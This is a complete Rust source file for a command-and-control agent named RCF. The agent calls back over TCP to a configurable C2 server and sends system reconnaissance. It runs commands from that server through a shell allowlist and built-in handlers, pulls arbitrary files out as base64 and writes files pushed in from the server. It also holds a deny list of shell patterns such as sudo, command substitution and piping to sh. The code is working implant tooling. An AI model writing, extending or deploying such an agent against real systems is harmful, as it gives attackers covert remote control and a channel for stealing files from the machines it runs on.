//! RCF C2 Agent — connects back to C2 server and executes commands.
//!
//! Protocol:
//! 1. Agent connects to C2 server (TCP)
//! 2. Agent sends greeting: "RCF_AGENT_V1:<psk>\n"
//! 3. C2 responds: "RCF_AUTH_SUCCESS\n" or "AUTH_FAILED\n"
//! 4. Agent sends sysinfo JSON: "RCF_SYSINFO\n{...}\nRCF_SYSINFO_END\n"
//! 5. Command loop:
//!    - C2 sends command: "<command>\n"
//!    - Agent executes, sends output: "RCF_OUTPUT\n<base64_stdout>\n<base64_stderr>\n<exit_code>\nRCF_OUTPUT_END\n"
//! 6. C2 sends "RCF_EXIT\n" to disconnect
//!
//! # Security
//! The agent enforces a command allowlist to prevent arbitrary command execution.
//! A non-empty PSK is required at startup — the agent will refuse to run without one.

use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;

// ── Configuration ─────────────────────────────────────────────────────────────

struct AgentConfig {
    host: String,
    port: u16,
    psk: String,
}

impl AgentConfig {
    fn from_args() -> Self {
        // Compile-time baked-in defaults (set via env vars during build)
        let default_host = option_env!("RCF_AGENT_HOST").unwrap_or("127.0.0.1");
        let default_port: u16 = option_env!("RCF_AGENT_PORT")
            .and_then(|s| s.parse().ok())
            .unwrap_or(8443);
        // SECURITY: No default PSK — must be explicitly provided
        let default_psk = "";

        let mut host = default_host.to_string();
        let mut port = default_port;
        let mut psk = default_psk.to_string();

        let args: Vec<String> = std::env::args().skip(1).collect();
        let mut i = 0;
        while i < args.len() {
            match args[i].as_str() {
                "--host" | "-h" => {
                    if i + 1 < args.len() {
                        host = args[i + 1].clone();
                        i += 1;
                    }
                }
                "--port" | "-p" => {
                    if i + 1 < args.len() {
                        port = args[i + 1].parse().unwrap_or(default_port);
                        i += 1;
                    }
                }
                "--psk" => {
                    if i + 1 < args.len() {
                        psk = args[i + 1].clone();
                        i += 1;
                    }
                }
                _ => {}
            }
            i += 1;
        }

        Self { host, port, psk }
    }
}

// ── System Information ────────────────────────────────────────────────────────

#[derive(serde::Serialize)]
struct SysInfo {
    hostname: String,
    username: String,
    os: String,
    arch: String,
    pid: u32,
    cwd: String,
}

impl SysInfo {
    fn collect() -> Self {
        Self {
            hostname: get_hostname(),
            username: get_username(),
            os: get_os(),
            arch: get_arch(),
            pid: std::process::id(),
            cwd: std::env::current_dir()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| "?".to_string()),
        }
    }
}

fn get_hostname() -> String {
    #[cfg(unix)]
    {
        let output = Command::new("hostname").output();
        match output {
            Ok(o) => String::from_utf8_lossy(&o.stdout).trim().to_string(),
            Err(_) => "unknown".to_string(),
        }
    }
    #[cfg(windows)]
    {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
    }
}

fn get_username() -> String {
    #[cfg(unix)]
    {
        let output = Command::new("whoami").output();
        match output {
            Ok(o) => String::from_utf8_lossy(&o.stdout).trim().to_string(),
            Err(_) => "unknown".to_string(),
        }
    }
    #[cfg(windows)]
    {
        let user = std::env::var("USERNAME").or_else(|_| std::env::var("USER"));
        user.unwrap_or_else(|_| "unknown".to_string())
    }
}

fn get_os() -> String {
    if cfg!(target_os = "linux") {
        // Try to get distro info
        let output = Command::new("sh")
            .arg("-c")
            .arg("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'\"' -f2")
            .output();
        match output {
            Ok(o) => {
                let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
                if s.is_empty() { "Linux".to_string() } else { s }
            }
            Err(_) => "Linux".to_string(),
        }
    } else if cfg!(target_os = "windows") {
        "Windows".to_string()
    } else if cfg!(target_os = "macos") {
        "macOS".to_string()
    } else {
        std::env::consts::OS.to_string()
    }
}

fn get_arch() -> String {
    std::env::consts::ARCH.to_string()
}

// ── Built-in Commands ─────────────────────────────────────────────────────────

/// Handle built-in commands that don't need shell execution.
fn handle_builtin(cmd: &str, args: &[&str]) -> Option<(String, String, i32)> {
    match cmd {
        "rcf_sysinfo" => {
            let info = SysInfo::collect();
            let json = serde_json::to_string_pretty(&info).unwrap_or_default();
            Some((json, String::new(), 0))
        }
        "pwd" => {
            let cwd = std::env::current_dir()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| "?".to_string());
            Some((cwd, String::new(), 0))
        }
        "getpid" => Some((std::process::id().to_string(), String::new(), 0)),
        "getuid" => Some((get_username(), String::new(), 0)),
        "sysinfo" => {
            let info = SysInfo::collect();
            let output = format!(
                "Hostname:  {}\nUsername:  {}\nOS:        {}\nArch:      {}\nPID:       {}\nCWD:       {}",
                info.hostname, info.username, info.os, info.arch, info.pid, info.cwd
            );
            Some((output, String::new(), 0))
        }
        "exit" | "quit" => {
            // Signal the main loop to disconnect
            Some((String::new(), String::new(), 0))
        }
        "ls" | "dir" => {
            let path = args.first().copied().unwrap_or(".");
            let entries = std::fs::read_dir(path);
            match entries {
                Ok(entries) => {
                    let mut lines = Vec::new();
                    for entry in entries.filter_map(|e| e.ok()) {
                        let name = entry.file_name();
                        let name_str = name.to_string_lossy();
                        let meta = entry.metadata();
                        if let Ok(m) = meta {
                            let size = m.len();
                            let is_dir = m.is_dir();
                            let type_char = if is_dir { "D" } else { "F" };
                            lines.push(format!("{}  {:>12}  {}", type_char, size, name_str));
                        } else {
                            lines.push(format!("?  {:>12}  {}", "?", name_str));
                        }
                    }
                    lines.sort();
                    Some((lines.join("\n"), String::new(), 0))
                }
                Err(e) => Some((String::new(), format!("ls: {}: {}", path, e), 1)),
            }
        }
        "cd" => {
            if let Some(dir) = args.first() {
                match std::env::set_current_dir(dir) {
                    Ok(()) => Some((String::new(), String::new(), 0)),
                    Err(e) => Some((String::new(), format!("cd: {}: {}", dir, e), 1)),
                }
            } else {
                // cd with no args → go to home
                if let Some(home) = dirs_next::home_dir() {
                    match std::env::set_current_dir(&home) {
                        Ok(()) => Some((String::new(), String::new(), 0)),
                        Err(e) => {
                            Some((String::new(), format!("cd: {}: {}", home.display(), e), 1))
                        }
                    }
                } else {
                    Some((String::new(), "cd: no home directory".to_string(), 1))
                }
            }
        }
        "cat" => {
            if let Some(file) = args.first() {
                match std::fs::read_to_string(file) {
                    Ok(content) => Some((content, String::new(), 0)),
                    Err(e) => Some((String::new(), format!("cat: {}: {}", file, e), 1)),
                }
            } else {
                Some((String::new(), "cat: missing operand".to_string(), 1))
            }
        }
        "ps" => {
            // Cross-platform process listing
            #[cfg(unix)]
            {
                let output = Command::new("ps").arg("aux").output();
                match output {
                    Ok(o) => {
                        let stdout = String::from_utf8_lossy(&o.stdout).to_string();
                        Some((stdout, String::new(), 0))
                    }
                    Err(e) => Some((String::new(), format!("ps: {}", e), 1)),
                }
            }
            #[cfg(windows)]
            {
                let output = Command::new("tasklist").arg("/FO").arg("TABLE").output();
                match output {
                    Ok(o) => {
                        let stdout = String::from_utf8_lossy(&o.stdout).to_string();
                        Some((stdout, String::new(), 0))
                    }
                    Err(e) => Some((String::new(), format!("ps: {}", e), 1)),
                }
            }
        }
        "upload" => {
            // upload is handled by the C2 server sending RCF_UPLOAD protocol block
            // This builtin just acknowledges
            Some((
                "upload: waiting for file data from C2 server...\n\
                 [agent] Use 'upload' from C2 console to send file to this agent"
                    .to_string(),
                String::new(),
                0,
            ))
        }
        "download" => {
            // download <remote_path>
            if let Some(file) = args.first() {
                match std::fs::read(file) {
                    Ok(data) => {
                        // Send file as base64
                        let b64 = base64_encode(&data);
                        Some((format!("RCF_FILE:{}\n{}", file, b64), String::new(), 0))
                    }
                    Err(e) => Some((String::new(), format!("download: {}: {}", file, e), 1)),
                }
            } else {
                Some((String::new(), "download: missing file path".to_string(), 1))
            }
        }
        _ => None, // Not a built-in command, fall through to shell execution
    }
}

// ── Command Execution ─────────────────────────────────────────────────────────

/// SECURITY: Command allowlist to prevent arbitrary command execution.
/// Only permitted commands are allowed; all others are rejected.
const ALLOWED_COMMANDS: &[&str] = &[
    // System info (read-only)
    "uname",
    "whoami",
    "id",
    "hostname",
    "uptime",
    "df",
    "du",
    "free",
    "ps",
    "top",
    "pidof",
    "pgrep",
    // File viewing (read-only)
    "cat",
    "head",
    "tail",
    "less",
    "more",
    "grep",
    "awk",
    "sed",
    "cut",
    "sort",
    "uniq",
    "wc",
    "ls",
    "pwd",
    "find",
    // Network (read-only)
    "netstat",
    "ss",
    "ip",
    "ifconfig",
    "route",
    "arp",
    "ping",
    "traceroute",
    "nslookup",
    "dig",
    "host",
    // Safe utilities
    "echo",
    "printf",
    "test",
    "true",
    "false",
    "env",
    "printenv",
    "date",
    "cal",
    "bc",
    "factor",
    "mkdir",
    "touch",
    "cp",
    "mv",
    // Package managers (read-only queries)
    "dpkg",
    "rpm",
    "apt",
    "yum",
    "dnf",
];

/// Patterns that indicate potentially dangerous commands even if base command is allowed.
const SUSPICIOUS_PATTERNS: &[&str] = &[
    "sudo ",
    "su ",
    "chmod 7",
    "chmod 6",
    "chown ",
    "chgrp ",
    ">/dev/",
    "2>/dev/",
    ">>/",
    "| /",
    "& /",
    "eval ",
    "exec ",
    "source ",
    "$(",
    "`",
    "|sh",
    "|bash",
    ";rm ",
    "; rm ",
    "mkfs",
    "dd ",
    "fdisk",
    "parted",
    "cryptsetup",
];

/// Check if a command line is allowed per the security allowlist.
fn is_command_allowed(cmd_line: &str) -> Result<(), String> {
    let trimmed = cmd_line.trim();
    if trimmed.is_empty() {
        return Ok(());
    }

    // Extract the base command
    let base_cmd = trimmed.split_whitespace().next().unwrap_or("");
    let base_lower = base_cmd.to_lowercase();

    // Check allowlist
    if !ALLOWED_COMMANDS
        .iter()
        .any(|&c| c.eq_ignore_ascii_case(&base_lower))
    {
        return Err(format!(
            "Command '{}' not in allowlist. Allowed: {}",
            base_cmd,
            ALLOWED_COMMANDS
                .iter()
                .take(8)
                .copied()
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }

    // Check for suspicious patterns
    let cmd_lower = trimmed.to_lowercase();
    for pattern in SUSPICIOUS_PATTERNS {
        if cmd_lower.contains(pattern) {
            return Err(format!("Blocked suspicious pattern: '{}'", pattern));
        }
    }

    Ok(())
}

fn execute_command(cmd_line: &str) -> (String, String, i32) {
    let cmd_line = cmd_line.trim();
    if cmd_line.is_empty() {
        return (String::new(), String::new(), 0);
    }

    // Parse command and arguments
    let parts: Vec<&str> = cmd_line.split_whitespace().collect();
    if parts.is_empty() {
        return (String::new(), String::new(), 0);
    }

    let cmd = parts[0];
    let args: Vec<&str> = parts[1..].to_vec();

    // Check built-in commands first
    if let Some(result) = handle_builtin(cmd, &args) {
        return result;
    }

    // SECURITY: Check allowlist before shell execution
    if let Err(e) = is_command_allowed(cmd_line) {
        return (String::new(), format!("[SECURITY] {}", e), 1);
    }

    // Execute via shell (allowlisted commands only)
    #[cfg(unix)]
    {
        let output = Command::new("/bin/sh").arg("-c").arg(cmd_line).output();

        match output {
            Ok(o) => {
                let stdout = String::from_utf8_lossy(&o.stdout).to_string();
                let stderr = String::from_utf8_lossy(&o.stderr).to_string();
                let exit_code = o.status.code().unwrap_or(-1);
                (stdout, stderr, exit_code)
            }
            Err(e) => (String::new(), format!("Failed to execute: {}", e), -1),
        }
    }

    #[cfg(windows)]
    {
        let output = Command::new("cmd").arg("/C").arg(cmd_line).output();

        match output {
            Ok(o) => {
                let stdout = String::from_utf8_lossy(&o.stdout).to_string();
                let stderr = String::from_utf8_lossy(&o.stderr).to_string();
                let exit_code = o.status.code().unwrap_or(-1);
                (stdout, stderr, exit_code)
            }
            Err(e) => (String::new(), format!("Failed to execute: {}", e), -1),
        }
    }
}

// ── Simple base64 encoder/decoder (no external dependency) ────────────────────

fn base64_encode(data: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::with_capacity(data.len().div_ceil(3) * 4);
    let chunks = data.chunks_exact(3);
    let remainder = chunks.remainder();

    for chunk in chunks {
        let n = ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8) | (chunk[2] as u32);
        result.push(TABLE[(n >> 18) as usize] as char);
        result.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
        result.push(TABLE[((n >> 6) & 0x3F) as usize] as char);
        result.push(TABLE[(n & 0x3F) as usize] as char);
    }

    match remainder {
        [a] => {
            let n = (*a as u32) << 16;
            result.push(TABLE[(n >> 18) as usize] as char);
            result.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
            result.push('=');
            result.push('=');
        }
        [a, b] => {
            let n = ((*a as u32) << 16) | ((*b as u32) << 8);
            result.push(TABLE[(n >> 18) as usize] as char);
            result.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
            result.push(TABLE[((n >> 6) & 0x3F) as usize] as char);
            result.push('=');
        }
        _ => {}
    }

    result
}

fn base64_decode(input: &str) -> Vec<u8> {
    let table = |b: u8| -> u8 {
        match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a' + 26,
            b'0'..=b'9' => b - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => 0,
        }
    };

    let bytes: Vec<u8> = input
        .bytes()
        .filter(|&b| b != b'\n' && b != b'\r' && b != b' ')
        .collect();
    let mut result = Vec::with_capacity(bytes.len() * 3 / 4);

    let chunks = bytes.chunks_exact(4);
    let remainder = chunks.remainder();

    for chunk in chunks {
        let n = ((table(chunk[0]) as u32) << 18)
            | ((table(chunk[1]) as u32) << 12)
            | ((table(chunk[2]) as u32) << 6)
            | (table(chunk[3]) as u32);
        result.push((n >> 16) as u8);
        result.push(((n >> 8) & 0xFF) as u8);
        result.push((n & 0xFF) as u8);
    }

    if remainder.len() >= 2 {
        let n = ((table(remainder[0]) as u32) << 18) | ((table(remainder[1]) as u32) << 12);
        result.push((n >> 16) as u8);
        if remainder.len() >= 3 && remainder[2] != b'=' {
            result.push(((n >> 8) & 0xFF) as u8);
        }
    }

    result
}

// ── Protocol Helpers ──────────────────────────────────────────────────────────

fn send_line(stream: &mut TcpStream, line: &str) -> std::io::Result<()> {
    stream.write_all(line.as_bytes())?;
    stream.write_all(b"\n")?;
    stream.flush()
}

fn read_line(reader: &mut BufReader<&TcpStream>) -> std::io::Result<String> {
    let mut buf = String::new();
    reader.read_line(&mut buf)?;
    Ok(buf.trim_end_matches(&['\n', '\r'][..]).to_string())
}

fn send_output(
    stream: &mut TcpStream,
    stdout: &str,
    stderr: &str,
    exit_code: i32,
) -> std::io::Result<()> {
    let stdout_b64 = base64_encode(stdout.as_bytes());
    let stderr_b64 = base64_encode(stderr.as_bytes());

    send_line(stream, "RCF_OUTPUT")?;
    send_line(stream, &stdout_b64)?;
    send_line(stream, &stderr_b64)?;
    send_line(stream, &exit_code.to_string())?;
    send_line(stream, "RCF_OUTPUT_END")?;
    stream.flush()
}

// ── Main Agent Loop ───────────────────────────────────────────────────────────

fn run_agent(config: &AgentConfig) -> Result<(), String> {
    let addr = format!("{}:{}", config.host, config.port);

    // Connect to C2 server
    let stream =
        TcpStream::connect(&addr).map_err(|e| format!("Failed to connect to {}: {}", addr, e))?;

    stream
        .set_read_timeout(Some(Duration::from_secs(30)))
        .map_err(|e| format!("Failed to set read timeout: {}", e))?;
    stream
        .set_write_timeout(Some(Duration::from_secs(10)))
        .map_err(|e| format!("Failed to set write timeout: {}", e))?;

    // Clone stream for separate read/write handles
    let write_stream = stream
        .try_clone()
        .map_err(|e| format!("Failed to clone stream: {}", e))?;

    let mut reader = BufReader::new(&stream);
    let mut writer = write_stream;

    // Authenticate
    let greeting = if config.psk.is_empty() {
        "RCF_AGENT_V1:".to_string()
    } else {
        format!("RCF_AGENT_V1:{}", config.psk)
    };
    send_line(&mut writer, &greeting).map_err(|e| format!("Failed to send greeting: {}", e))?;

    // Read auth response
    let response =
        read_line(&mut reader).map_err(|e| format!("Failed to read auth response: {}", e))?;

    if response != "RCF_AUTH_SUCCESS" {
        return Err(format!("Authentication failed: {}", response));
    }

    // Send sysinfo
    let info = SysInfo::collect();
    let sysinfo_json = serde_json::to_string(&info).unwrap_or_default();
    send_line(&mut writer, "RCF_SYSINFO").map_err(|e| format!("Failed to send sysinfo: {}", e))?;
    send_line(&mut writer, &sysinfo_json).map_err(|e| format!("Failed to send sysinfo: {}", e))?;
    send_line(&mut writer, "RCF_SYSINFO_END")
        .map_err(|e| format!("Failed to send sysinfo: {}", e))?;

    // Command loop
    loop {
        let cmd = match read_line(&mut reader) {
            Ok(line) => line,
            Err(e) => {
                // Connection lost or timeout
                eprintln!("[agent] Connection lost: {}", e);
                break;
            }
        };

        if cmd.is_empty() {
            continue;
        }

        // Check for protocol blocks
        if cmd == "RCF_EXIT" {
            break;
        }

        // Handle file upload from C2
        if cmd == "RCF_UPLOAD" {
            let file_b64 = match read_line(&mut reader) {
                Ok(l) => l,
                Err(e) => {
                    eprintln!("[agent] Failed to read upload data: {}", e);
                    break;
                }
            };
            let file_path = match read_line(&mut reader) {
                Ok(l) => l,
                Err(e) => {
                    eprintln!("[agent] Failed to read upload path: {}", e);
                    break;
                }
            };
            let _end_marker = read_line(&mut reader); // RCF_UPLOAD_END

            // Decode and write file
            let file_data = base64_decode(&file_b64);
            let upload_result = std::fs::write(&file_path, &file_data);

            let (stdout, stderr, exit_code) = match upload_result {
                Ok(()) => (
                    format!("Uploaded {} bytes to {}\n", file_data.len(), file_path),
                    String::new(),
                    0,
                ),
                Err(e) => (String::new(), format!("upload: {}: {}\n", file_path, e), 1),
            };

            if let Err(e) = send_output(&mut writer, &stdout, &stderr, exit_code) {
                eprintln!("[agent] Failed to send upload result: {}", e);
                break;
            }
            continue;
        }

        // Execute command
        let (stdout, stderr, exit_code) = execute_command(&cmd);

        // Send output back
        if let Err(e) = send_output(&mut writer, &stdout, &stderr, exit_code) {
            eprintln!("[agent] Failed to send output: {}", e);
            break;
        }
    }

    Ok(())
}

// ── Entry Point ───────────────────────────────────────────────────────────────

fn main() {
    let config = AgentConfig::from_args();

    if config.host.is_empty() {
        eprintln!("Usage: rcf-agent --host <ip> --port <port> --psk <key>");
        std::process::exit(1);
    }

    // SECURITY: Require non-empty PSK before proceeding
    if config.psk.is_empty() {
        eprintln!(
            "[!] ERROR: PSK is required. Provide one via --psk <key> or RCF_AGENT_PSK env var."
        );
        eprintln!("[!] Generate a secure PSK: openssl rand -hex 32");
        std::process::exit(1);
    }

    match run_agent(&config) {
        Ok(()) => eprintln!("[agent] Disconnected cleanly"),
        Err(e) => {
            eprintln!("[agent] Error: {}", e);
            // Retry once after 5 seconds (simple resilience)
            eprintln!("[agent] Retrying in 5 seconds...");
            std::thread::sleep(Duration::from_secs(5));
            match run_agent(&config) {
                Ok(()) => eprintln!("[agent] Disconnected cleanly (retry)"),
                Err(e) => {
                    eprintln!("[agent] Retry failed: {}", e);
                    std::process::exit(1);
                }
            }
        }
    }
}

// ── Minimal dirs_next replacement (avoids external dep) ───────────────────────
mod dirs_next {
    pub fn home_dir() -> Option<std::path::PathBuf> {
        #[cfg(unix)]
        {
            std::env::var("HOME").ok().map(std::path::PathBuf::from)
        }
        #[cfg(windows)]
        {
            std::env::var("USERPROFILE")
                .ok()
                .map(std::path::PathBuf::from)
        }
    }
}
